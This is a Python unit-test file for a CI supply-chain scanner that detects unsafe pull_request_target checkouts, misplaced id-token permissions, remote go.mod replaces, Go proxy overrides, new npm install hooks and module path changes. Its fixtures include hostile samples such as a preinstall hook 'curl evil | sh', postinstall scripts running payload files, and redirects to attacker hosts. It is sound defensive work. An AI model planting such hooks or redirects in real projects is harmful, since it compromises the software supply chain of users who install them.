#!/usr/bin/env python3
"""Unit tests for the supply-chain scan.

Run from this directory:
    python3 -m unittest scan_test
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
import textwrap
import unittest
from pathlib import Path

import scan
import signals


def _fc(
    path: str,
    *,
    base: str | None = None,
    head: str | None = None,
    added: list[tuple[int, str]] | None = None,
) -> signals.FileChange:
    """Quick FileChange builder for signal unit tests."""
    return signals.FileChange(
        path=path,
        base_content=base,
        head_content=head,
        added_lines=added or [],
    )


# ---------------------------------------------------------------------------
# Signal-level unit tests (no git needed — exercise pure logic)
# ---------------------------------------------------------------------------


class WorkflowTrustSignalTest(unittest.TestCase):
    def test_pull_request_target_with_head_sha_ref_blocks(self) -> None:
        wf = textwrap.dedent(
            """
            name: bad
            on:
              pull_request_target:
            jobs:
              x:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
                    with:
                      ref: ${{ github.event.pull_request.head.sha }}
            """
        )
        findings = signals.signal_workflow_trust(_fc(".github/workflows/bad.yml", head=wf))
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())
        self.assertIn("TanStack", findings[0].message)

    def test_pull_request_target_with_head_ref_blocks(self) -> None:
        wf = textwrap.dedent(
            """
            on:
              pull_request_target:
            jobs:
              x:
                steps:
                  - uses: actions/checkout@v4
                    with:
                      ref: ${{ github.event.pull_request.head.ref }}
            """
        )
        findings = signals.signal_workflow_trust(_fc(".github/workflows/bad.yml", head=wf))
        self.assertEqual(len(findings), 1)

    def test_pull_request_target_with_refs_pull_merge_blocks(self) -> None:
        wf = textwrap.dedent(
            """
            on: pull_request_target
            jobs:
              x:
                steps:
                  - uses: actions/checkout@v4
                    with:
                      ref: refs/pull/${{ github.event.number }}/merge
            """
        )
        findings = signals.signal_workflow_trust(_fc(".github/workflows/bad.yml", head=wf))
        self.assertEqual(len(findings), 1)

    def test_safe_pull_request_target_no_checkout_does_not_block(self) -> None:
        """Mirrors the existing greptile-policy-gate.yml posture: pull_request_target,
        no PR-head checkout, only API calls. Must NOT trigger."""
        wf = textwrap.dedent(
            """
            on:
              pull_request_target:
            permissions:
              checks: read
              pull-requests: write
            jobs:
              gate:
                runs-on: ubuntu-latest
                steps:
                  - run: gh api repos/${{ github.repository }}/pulls/${{ github.event.pull_request.number }}
            """
        )
        findings = signals.signal_workflow_trust(_fc(".github/workflows/policy.yml", head=wf))
        self.assertEqual(findings, [])

    def test_pull_request_target_with_safe_checkout_does_not_block(self) -> None:
        """pull_request_target + actions/checkout but no `ref:` override (defaults
        to base SHA) is safe."""
        wf = textwrap.dedent(
            """
            on:
              pull_request_target:
            jobs:
              x:
                steps:
                  - uses: actions/checkout@v4
            """
        )
        findings = signals.signal_workflow_trust(_fc(".github/workflows/ok.yml", head=wf))
        self.assertEqual(findings, [])

    def test_plain_pull_request_with_head_ref_does_not_block(self) -> None:
        """pull_request (not _target) + head ref is fine — no elevated context."""
        wf = textwrap.dedent(
            """
            on:
              pull_request:
            jobs:
              x:
                steps:
                  - uses: actions/checkout@v4
                    with:
                      ref: ${{ github.event.pull_request.head.sha }}
            """
        )
        findings = signals.signal_workflow_trust(_fc(".github/workflows/ci.yml", head=wf))
        self.assertEqual(findings, [])


class IdTokenSignalTest(unittest.TestCase):
    def test_id_token_in_non_publish_workflow_blocks(self) -> None:
        wf = "permissions:\n  id-token: write\n  contents: read\n"
        findings = signals.signal_id_token_outside_allowlist(
            _fc(".github/workflows/verify-skills.yml", head=wf)
        )
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())

    def test_id_token_in_npm_publish_does_not_block(self) -> None:
        wf = "permissions:\n  id-token: write\n  contents: read\n"
        findings = signals.signal_id_token_outside_allowlist(
            _fc(".github/workflows/npm-publish.yml", head=wf)
        )
        self.assertEqual(findings, [])

    def test_no_id_token_does_not_block(self) -> None:
        wf = "permissions:\n  contents: read\n"
        findings = signals.signal_id_token_outside_allowlist(
            _fc(".github/workflows/anything.yml", head=wf)
        )
        self.assertEqual(findings, [])


class GomodReplaceSignalTest(unittest.TestCase):
    def test_replace_to_github_blocks(self) -> None:
        change = _fc(
            "library/payments/kalshi/go.mod",
            head="module github.com/mvanhorn/printing-press-library/library/payments/kalshi\n\nreplace example.com/foo => github.com/attacker/fork v0.0.1\n",
            added=[(3, "replace example.com/foo => github.com/attacker/fork v0.0.1")],
        )
        findings = signals.signal_gomod_replace(change)
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())
        self.assertEqual(findings[0].signal_id, "gomod_replace_remote_target")

    def test_replace_to_https_url_blocks(self) -> None:
        change = _fc(
            "library/payments/kalshi/go.mod",
            head="...",
            added=[(3, "replace foo => https://evil.example/foo v1.0.0")],
        )
        findings = signals.signal_gomod_replace(change)
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())

    def test_replace_to_local_path_advises_only(self) -> None:
        change = _fc(
            "library/food-and-dining/foo/go.mod",
            head="...",
            added=[(3, "replace github.com/ledongthuc/pdf => ./third_party/stubs/pdf")],
        )
        findings = signals.signal_gomod_replace(change)
        self.assertEqual(len(findings), 1)
        self.assertFalse(findings[0].is_block())
        self.assertEqual(findings[0].severity, "advise")
        self.assertEqual(findings[0].signal_id, "gomod_replace_local_target")

    def test_replace_to_parent_path_advises_only(self) -> None:
        change = _fc(
            "library/foo/bar/go.mod",
            head="...",
            added=[(3, "replace foo => ../../vendor/foo")],
        )
        findings = signals.signal_gomod_replace(change)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, "advise")

    def test_no_new_replace_does_not_fire(self) -> None:
        """The diff has no added lines (e.g., reprint regenerates identical content) →
        existing replace directives in head_content are not re-flagged."""
        change = _fc(
            "library/food-and-dining/ordertogo/go.mod",
            head="module github.com/mvanhorn/printing-press-library/library/food-and-dining/ordertogo\n\nreplace github.com/browserutils/kooky => ./third_party/kooky\n",
            added=[],
        )
        findings = signals.signal_gomod_replace(change)
        self.assertEqual(findings, [])

    def test_replace_outside_library_does_not_fire(self) -> None:
        change = _fc(
            "tools/generate-registry/go.mod",
            head="...",
            added=[(3, "replace foo => github.com/attacker/fork v1.0.0")],
        )
        findings = signals.signal_gomod_replace(change)
        self.assertEqual(findings, [])


class GoEnvOverrideSignalTest(unittest.TestCase):
    def test_goproxy_in_workflow_blocks(self) -> None:
        wf = "jobs:\n  x:\n    env:\n      GOPROXY: https://mirror.attacker.example\n"
        findings = signals.signal_go_env_override(_fc(".github/workflows/bad.yml", head=wf))
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())

    def test_goflags_blocks(self) -> None:
        wf = "env:\n  GOFLAGS: -insecure\n"
        findings = signals.signal_go_env_override(_fc(".github/workflows/bad.yml", head=wf))
        self.assertEqual(len(findings), 1)

    def test_gonosumcheck_blocks(self) -> None:
        wf = "env:\n  GONOSUMCHECK: '*'\n"
        findings = signals.signal_go_env_override(_fc(".github/workflows/bad.yml", head=wf))
        self.assertEqual(len(findings), 1)

    def test_unrelated_env_does_not_fire(self) -> None:
        wf = "env:\n  GO_VERSION: 1.22\n  CGO_ENABLED: 0\n"
        findings = signals.signal_go_env_override(_fc(".github/workflows/ok.yml", head=wf))
        self.assertEqual(findings, [])


class NpmLifecycleSignalTest(unittest.TestCase):
    def test_postinstall_added_blocks(self) -> None:
        base = json.dumps({"name": "x", "scripts": {"build": "tsc"}})
        head = json.dumps({"name": "x", "scripts": {"build": "tsc", "postinstall": "node ./mal.js"}})
        findings = signals.signal_npm_lifecycle_script(
            _fc("npm/package.json", base=base, head=head)
        )
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())

    def test_existing_prepublishonly_not_flagged(self) -> None:
        """prepublishOnly is allowed (CI-only). Not in the watched set."""
        base = json.dumps({"name": "x", "scripts": {"prepublishOnly": "npm test"}})
        head = json.dumps({"name": "x", "scripts": {"prepublishOnly": "npm test && npm run build"}})
        findings = signals.signal_npm_lifecycle_script(
            _fc("npm/package.json", base=base, head=head)
        )
        self.assertEqual(findings, [])

    def test_existing_postinstall_not_re_flagged(self) -> None:
        """If a postinstall already existed on base (it doesn't here, but hypothetically),
        modifying it should not fire — we only flag *added* lifecycle scripts."""
        base = json.dumps({"scripts": {"postinstall": "node a.js"}})
        head = json.dumps({"scripts": {"postinstall": "node b.js"}})
        findings = signals.signal_npm_lifecycle_script(
            _fc("npm/package.json", base=base, head=head)
        )
        self.assertEqual(findings, [])

    def test_preinstall_added_blocks(self) -> None:
        base = json.dumps({"scripts": {}})
        head = json.dumps({"scripts": {"preinstall": "curl evil | sh"}})
        findings = signals.signal_npm_lifecycle_script(
            _fc("npm/package.json", base=base, head=head)
        )
        self.assertEqual(len(findings), 1)

    def test_prepare_added_blocks(self) -> None:
        base = json.dumps({"scripts": {}})
        head = json.dumps({"scripts": {"prepare": "node ./build.js"}})
        findings = signals.signal_npm_lifecycle_script(
            _fc("npm/package.json", base=base, head=head)
        )
        self.assertEqual(len(findings), 1)

    def test_outside_npm_package_json_does_not_fire(self) -> None:
        head = json.dumps({"scripts": {"postinstall": "node ./mal.js"}})
        findings = signals.signal_npm_lifecycle_script(
            _fc("library/x/foo/promo/package.json", head=head)
        )
        self.assertEqual(findings, [])


class ModulePathDriftSignalTest(unittest.TestCase):
    PREFIX = "github.com/mvanhorn/printing-press-library/library/"

    def test_drift_to_attacker_path_blocks(self) -> None:
        base = f"module {self.PREFIX}payments/kalshi\n\ngo 1.22\n"
        head = "module github.com/attacker/kalshi-fork\n\ngo 1.22\n"
        change = _fc("library/payments/kalshi/go.mod", base=base, head=head)
        findings = signals.signal_module_path_drift(change)
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())
        self.assertEqual(findings[0].signal_id, "module_path_drift_on_existing_cli")

    def test_canonical_path_unchanged_does_not_fire(self) -> None:
        same = f"module {self.PREFIX}payments/kalshi\n\ngo 1.22\n"
        change = _fc("library/payments/kalshi/go.mod", base=same, head=same)
        findings = signals.signal_module_path_drift(change)
        self.assertEqual(findings, [])

    def test_new_cli_with_canonical_path_does_not_fire(self) -> None:
        head = f"module {self.PREFIX}other/freshly-minted\n\ngo 1.22\n"
        change = _fc("library/other/freshly-minted/go.mod", base=None, head=head)
        findings = signals.signal_module_path_drift(change)
        self.assertEqual(findings, [])

    def test_new_cli_with_non_canonical_path_blocks(self) -> None:
        head = "module github.com/someone-else/whatever\n\ngo 1.22\n"
        change = _fc("library/other/freshly-minted/go.mod", base=None, head=head)
        findings = signals.signal_module_path_drift(change)
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())
        self.assertEqual(findings[0].signal_id, "module_path_noncanonical_on_new_cli")


# ---------------------------------------------------------------------------
# Integration test: real git repo, end-to-end scan invocation
# ---------------------------------------------------------------------------


class ScanIntegrationTest(unittest.TestCase):
    """Exercise scan.main() against real git diffs in a tempdir repo.

    This is the most expensive layer of testing but catches integration bugs
    that signal-level unit tests can't (git-show invocation, diff parsing,
    annotation emission, exit codes).
    """

    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp(prefix="verify-supply-chain-"))
        self.addCleanup(lambda: shutil.rmtree(self.tmp))
        self.old_root = scan.REPO_ROOT
        scan.REPO_ROOT = self.tmp
        self._git("init", "-q", "-b", "main")
        self._git("config", "user.email", "test@example.com")
        self._git("config", "user.name", "Test")
        self._git("commit", "--allow-empty", "-q", "-m", "init")

    def tearDown(self) -> None:
        scan.REPO_ROOT = self.old_root

    def _git(self, *args: str) -> subprocess.CompletedProcess[str]:
        return subprocess.run(
            ["git", *args],
            cwd=self.tmp,
            check=True,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )

    def _write(self, rel: str, content: str) -> None:
        p = self.tmp / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)

    def _commit(self, message: str) -> None:
        self._git("add", "-A")
        self._git("commit", "-q", "--allow-empty", "-m", message)

    def _run_scan(self, base: str = "main", head: str = "HEAD", strict: bool = False) -> int:
        argv = ["--base-ref", base, "--head-ref", head]
        if strict:
            argv.append("--strict")
        return scan.main(argv)

    # -------- Happy paths --------

    def test_clean_pr_no_findings(self) -> None:
        """Bug fix to a CLI's internal/cli/ — no scoped files touched → exit 0."""
        self._write("library/payments/kalshi/internal/cli/root.go", "package cli\n")
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write("library/payments/kalshi/internal/cli/root.go", "package cli\n// edit\n")
        self._commit("tweak")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 0)

    # -------- Block-tier shapes --------

    def test_pr_target_with_head_checkout_fails(self) -> None:
        self._write(".github/workflows/existing.yml", "on: push\n")
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write(
            ".github/workflows/new.yml",
            "on:\n  pull_request_target:\njobs:\n  x:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n",
        )
        self._commit("add bad workflow")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 1)

    def test_id_token_in_non_publish_workflow_fails(self) -> None:
        self._write(".github/workflows/baseline.yml", "on: push\n")
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write(
            ".github/workflows/baseline.yml",
            "on: push\npermissions:\n  id-token: write\n",
        )
        self._commit("grant id-token")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 1)

    def test_id_token_in_npm_publish_allowed(self) -> None:
        self._write(".github/workflows/npm-publish.yml", "on: push\n")
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write(
            ".github/workflows/npm-publish.yml",
            "on: push\npermissions:\n  id-token: write\n",
        )
        self._commit("legitimate publishing OIDC")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 0)

    def test_replace_to_github_in_library_gomod_fails(self) -> None:
        gomod = "module github.com/mvanhorn/printing-press-library/library/payments/kalshi\n\ngo 1.22\n"
        self._write("library/payments/kalshi/go.mod", gomod)
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write(
            "library/payments/kalshi/go.mod",
            gomod + "\nreplace example.com/foo => github.com/attacker/fork v0.0.1\n",
        )
        self._commit("add malicious replace")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 1)

    def test_replace_to_local_path_advises_but_does_not_fail(self) -> None:
        gomod = "module github.com/mvanhorn/printing-press-library/library/food-and-dining/foo\n\ngo 1.22\n"
        self._write("library/food-and-dining/foo/go.mod", gomod)
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write(
            "library/food-and-dining/foo/go.mod",
            gomod + "\nreplace github.com/ledongthuc/pdf => ./third_party/stubs/pdf\n",
        )
        self._commit("vendor a fork locally")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 0)

    def test_existing_replace_directives_not_re_flagged(self) -> None:
        """Regression guard: the existing ordertogo CLI's three replace directives
        must NOT trip the scan when the PR doesn't touch that go.mod."""
        gomod = (
            "module github.com/mvanhorn/printing-press-library/library/food-and-dining/ordertogo\n"
            "\ngo 1.22\n"
            "replace github.com/browserutils/kooky => ./third_party/kooky\n"
            "replace github.com/ledongthuc/pdf => ./third_party/stubs/pdf\n"
            "replace github.com/orisano/pixelmatch => ./third_party/stubs/pixelmatch\n"
        )
        self._write("library/food-and-dining/ordertogo/go.mod", gomod)
        self._write("library/food-and-dining/ordertogo/internal/cli/root.go", "package cli\n")
        self._commit("baseline with existing replaces")
        self._git("checkout", "-q", "-b", "feat/x")
        # Touch ONLY internal Go source, not go.mod.
        self._write(
            "library/food-and-dining/ordertogo/internal/cli/root.go",
            "package cli\n// edit\n",
        )
        self._commit("unrelated edit")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 0)

    def test_goproxy_in_workflow_env_fails(self) -> None:
        self._write(".github/workflows/baseline.yml", "on: push\n")
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write(
            ".github/workflows/baseline.yml",
            "on: push\njobs:\n  x:\n    env:\n      GOPROXY: https://mirror.attacker.example\n",
        )
        self._commit("redirect GOPROXY")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 1)

    def test_postinstall_added_to_npm_fails(self) -> None:
        base = {"name": "@mvanhorn/printing-press", "scripts": {"build": "tsc"}}
        head = {"name": "@mvanhorn/printing-press", "scripts": {"build": "tsc", "postinstall": "node ./payload.js"}}
        self._write("npm/package.json", json.dumps(base, indent=2))
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write("npm/package.json", json.dumps(head, indent=2))
        self._commit("add postinstall")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 1)

    def test_module_path_drift_fails(self) -> None:
        base = "module github.com/mvanhorn/printing-press-library/library/payments/kalshi\n\ngo 1.22\n"
        head = "module github.com/attacker/kalshi-fork\n\ngo 1.22\n"
        self._write("library/payments/kalshi/go.mod", base)
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write("library/payments/kalshi/go.mod", head)
        self._commit("rewrite module path")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 1)

    def test_new_cli_canonical_module_path_passes(self) -> None:
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/new-cli")
        self._write(
            "library/other/freshly-minted/go.mod",
            "module github.com/mvanhorn/printing-press-library/library/other/freshly-minted\n\ngo 1.22\n",
        )
        self._commit("add new CLI")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 0)

    def test_strict_mode_promotes_advise_to_block(self) -> None:
        gomod = "module github.com/mvanhorn/printing-press-library/library/food-and-dining/foo\n\ngo 1.22\n"
        self._write("library/food-and-dining/foo/go.mod", gomod)
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write(
            "library/food-and-dining/foo/go.mod",
            gomod + "\nreplace foo => ./vendor/foo\n",
        )
        self._commit("local replace")
        rc = self._run_scan(base="main", strict=False)
        self.assertEqual(rc, 0)
        rc = self._run_scan(base="main", strict=True)
        self.assertEqual(rc, 1)


if __name__ == "__main__":
    unittest.main()
